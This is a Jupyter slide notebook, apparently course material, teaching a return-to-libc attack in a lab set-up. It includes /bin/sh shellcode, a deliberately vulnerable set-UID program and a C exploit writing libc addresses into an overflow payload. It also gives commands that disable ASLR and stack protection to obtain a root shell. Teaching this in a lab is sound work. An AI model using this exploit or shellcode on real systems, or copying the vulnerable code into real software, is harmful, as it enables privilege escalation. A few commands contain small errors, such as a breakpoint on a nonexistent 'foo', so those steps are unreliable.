{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "## <center> Return-to-libc Attack </center>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "### Stack-based Buffer Overflow Attack\n",
    "\n",
    "- Malicious data are used to overflow a function'return address in order to get the program to *jump* to a different location on the stack which stores malicious code. \n",
    "- This can be countered by making the stack non-executable"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "outputs": [],
   "source": [
    "%%writefile source/shellcode.c\n",
    "#include <string.h>\n",
    "\n",
    "const char code[] =\n",
    "  \"\\x31\\xc0\\x50\\x68//sh\\x68/bin\"\n",
    "  \"\\x89\\xe3\\x50\\x53\\x89\\xe1\\x99\"\n",
    "  \"\\xb0\\x0b\\xcd\\x80\";\n",
    "\n",
    "int main(int argc, char **argv)\n",
    "{\n",
    "   char buffer[sizeof(code)];\n",
    "   strcpy(buffer, code);\n",
    "   ((void(*)( ))buffer)( );\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "In a terminal, run the following commands:\n",
    "\n",
    "```\n",
    "$ gcc -z execstack -o shellcode Computer-Security/source/shellcode.c\n",
    "$ ./shellcode\n",
    "$ gcc -z noexecstack shellcode Computer-Security/source/shellcode.c\n",
    "$ ./shellcode\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "- Good countermeasure, but not enough.\n",
    "- If the stack is not executable, an alternative solution is to make the program jump to where there are executable codes.\n",
    "- Enter the region for standard C library on Linux, called **libc**"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "<center> <img src=\"figure/return-to-libc/libc1.jpg\" width=\"700\"/>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Overwriting source/mem_layout.c\n"
     ]
    }
   ],
   "source": [
    "%%writefile source/stack.c\n",
    "#include <stdlib.h>\n",
    "#include <stdio.h>\n",
    "#include <string.h>\n",
    "\n",
    "int vul_func(char *str)\n",
    "{\n",
    "    char buffer[50];\n",
    "\n",
    "    /* The following statement has a buffer overflow problem */\n",
    "    strcpy(buffer, str);    \n",
    "\n",
    "    return 1;\n",
    "}\n",
    "\n",
    "int main(int argc, char **argv)\n",
    "{\n",
    "    char str[240];\n",
    "    FILE *badfile;\n",
    "\n",
    "    badfile = fopen(\"badfile\", \"r\");\n",
    "    fread(str, sizeof(char), 200, badfile);\n",
    "    vul_func(str);\n",
    "\n",
    "    printf(\"Returned Properly\\n\");\n",
    "    return 1;\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "Run the followings:\n",
    "\n",
    "```\n",
    "$ gcc -fno-stack-protector -z noexecstack -o stack Computer-Security/source/stack.c\n",
    "$ sudo sysctl -w kernel.randomize_va_space=0\n",
    "```\n",
    "- `-fno-stack-protector`: disable protection against changes in stack\n",
    "- `-z noexecstack`: actually turn on protection against executable stack\n",
    "- `kernel.randomize_va_space=0`: disable address space layout randomization\n",
    "\n",
    "Afterward, turn the programinto a root-owned set-UID program\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "### Launch the Return-to-libc Attack\n",
    "\n",
    "- Task A: find where in memory is `system()` located\n",
    "- Task B: find the address of the `/bin/sh` string\n",
    "- Task C: where to place the address of `/bin/sh` in the stack so that `system()` can get to it"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "#### Task A: Find the address of the system() function\n",
    "\n",
    "Anytime a program runs, the libc library will be loaded into memory. Using `gdb`, we can find out the location of `system()`with the following commands:\n",
    "\n",
    "```\n",
    "$ gdb stack\n",
    "(gdb-peda)$ run\n",
    "(gdb-peda)$ p system\n",
    "(gdb-peda)$ p exit\n",
    "(gdb-peda)$ quit\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "#### Exercise:\n",
    "\n",
    "Rerun the above process with a different program (pick one from our previous lectures) to confirm that the locations of `system` and `exit` do not change. "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "#### Task B: Find the Address of the String \"/bin/sh\"\n",
    "\n",
    "- We want `system()` to execute `/bin/sh`\n",
    "- Therefore, `/bin/sh` must be in memory, and its address should be passed to `system()` as an argument. \n",
    "  - We cannot embed this in the source code (no access to source code of vulnerable program)\n",
    "- Solution:\n",
    "  - Utilize environment variables\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Writing source/find_myshell.c\n"
     ]
    }
   ],
   "source": [
    "%%writefile source/find_myshell.c\n",
    "#include <stdio.h>\n",
    "\n",
    "int main()\n",
    "{\n",
    "  char *shell = (char *) getenv(\"MYSHELL\");\n",
    "  if (shell) {\n",
    "    printf (\"Value: %s\\n\", shell);\n",
    "    printf (\"Address: %x\\n\", (unsigned int)shell); \n",
    "  }\n",
    "  return 1;\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "Run the followings:\n",
    "\n",
    "```\n",
    "$ gcc -o find_myshell55 Computer-Security/source/find_myshell.c\n",
    "$ export MYSHELL=\"/bin/sh\"\n",
    "$ ./find_myshell55\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "Recompile find_myshell.c to a file named `myshell77`. Rerun the program. Is the address for `/bin/sh` still the same? Why?"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "#### Function Prologue and Function Epilogue\n",
    "\n",
    "- In buffer overflow, we manually place both `system()` and its corresponding arguments on the stack for execution.\n",
    "- In return-to-libc, we invoke `system()` remotely.\n",
    "  - How can we place the corresponding arguments onto the stack?\n",
    "  - `$esp`: Stack register"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "<center> <img src=\"figure/return-to-libc/libc2.jpg\" width=\"400\"/>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "What happens before the internal instruction of a function is executed?"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "<center> <img src=\"figure/return-to-libc/libc3.jpg\" width=\"700\"/>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "<center> <img src=\"figure/return-to-libc/libc4.jpg\" width=\"700\"/>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "#### Important notes:\n",
    "- The malicious function did finish properly\n",
    "  - Its function epilogue was called\n",
    "  - We know the location of `$esp`\n",
    "- The malicious call redirect RA (next instruction) to a new function\n",
    "  - Activate this new function's prologue\n",
    "  - But this new fuction will rely on values in `$esp` for execution\n",
    "  - We need to manipulate `$esp`"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "Important when observe this picture: `$esp` and `$ebp` are values from `vul_func()`, but they are changed due to the procedural execution of `vul_func()`'s epilogue and `system()`'s prologue.\n",
    "\n",
    "<center> <img src=\"figure/return-to-libc/libc5.jpg\" width=\"700\"/>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Overwriting source/stack.c\n"
     ]
    }
   ],
   "source": [
    "%%writefile source/stack.c\n",
    "/* stack.c */\n",
    "#include <stdlib.h>\n",
    "#include <stdio.h>\n",
    "#include <string.h>\n",
    "\n",
    "int vul_func(char *str)\n",
    "{\n",
    "    char buffer[50];\n",
    "\n",
    "    /* The following statement has a buffer overflow problem */\n",
    "    strcpy(buffer, str);\n",
    "\n",
    "    return 1;\n",
    "}\n",
    "\n",
    "int main(int argc, char **argv)\n",
    "{\n",
    "    char str[240];\n",
    "    FILE *badfile;\n",
    "\n",
    "    badfile = fopen(\"badfile\", \"r\");\n",
    "    fread(str, sizeof(char), 200, badfile);\n",
    "    \n",
    "    char *shell = (char *) getenv(\"MYSHELL\");\n",
    "    if (shell) {\n",
    "      printf (\"Value: %s\\n\", shell);\n",
    "      printf (\"Address: %x\\n\", (unsigned int)shell); \n",
    "    }\n",
    "    \n",
    "    vul_func(str);\n",
    "\n",
    "    printf(\"Returned Properly\\n\");\n",
    "    return 1;\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "Run the followings:\n",
    "```\n",
    "$ gcc -g -o stack_dbg -z execstack -fno-stack-protector Computer-Security/source/stack.c\n",
    "$ rm badfile\n",
    "$ touch badfile\n",
    "$ gdb stack_dbg\n",
    "gdb-peda$ break foo\n",
    "gdb-peda$ run\n",
    "gdb-peda$ print $ebp\n",
    "gdb-peda$ print &buffer\n",
    "gdb-peda$ print ebp - buffer\n",
    "gdb-peda$ quit\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "- Offset of **3** is distance + 4: address of `system()`\n",
    "- Offset of **2** is distance + 8: address of `exit()`\n",
    "- Offset of **1** is distance plus 12: address of `/bin/sh`\n",
    "\n",
    "<center> <img src=\"figure/return-to-libc/libc5.jpg\" width=\"600\"/>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Overwriting source/ret_to_libc_exploit.c\n"
     ]
    }
   ],
   "source": [
    "%%writefile source/ret_to_libc_exploit.c\n",
    "#include <stdio.h>\n",
    "#include <string.h>\n",
    "int main(int argc, char **argv)\n",
    "{\n",
    "  char buf[200];\n",
    "  FILE *badfile;\n",
    "\n",
    "  memset(buf, 0xaa, 200); // fill the buffer with non-zeros\n",
    "\n",
    "  *(long *) &buf[70] = 0xbffffdbf ;   //  The address of \"/bin/sh\"\n",
    "  *(long *) &buf[66] = 0xb7d989d0 ;   //  The address of exit()\n",
    "  *(long *) &buf[62] = 0xb7da4da0 ;   //  The address of system()\n",
    "\n",
    "  badfile = fopen(\"./badfile\", \"w\");\n",
    "  fwrite(buf, sizeof(buf), 1, badfile);\n",
    "  fclose(badfile);\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "Run the followings (after modify exploit.c accordingly)\n",
    "```\n",
    "$ gcc -fno-stack-protector -z noexecstack -o stack Computer-Security/source/stack.c\n",
    "$ sudo sysctl -w kernel.randomize_va_space=0\n",
    "$ sudo chown root stack\n",
    "$ sudo chmod 4755 stack\n",
    "$ rm badfile\n",
    "$ gcc Computer-Security/source/ret_to_libc_exploit.c -o exploit\n",
    "$ ./exploit\n",
    "$ ./stack\n",
    "```\n",
    "Did you get the root shell?"
   ]
  }
 ],
 "metadata": {
  "celltoolbar": "Slideshow",
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
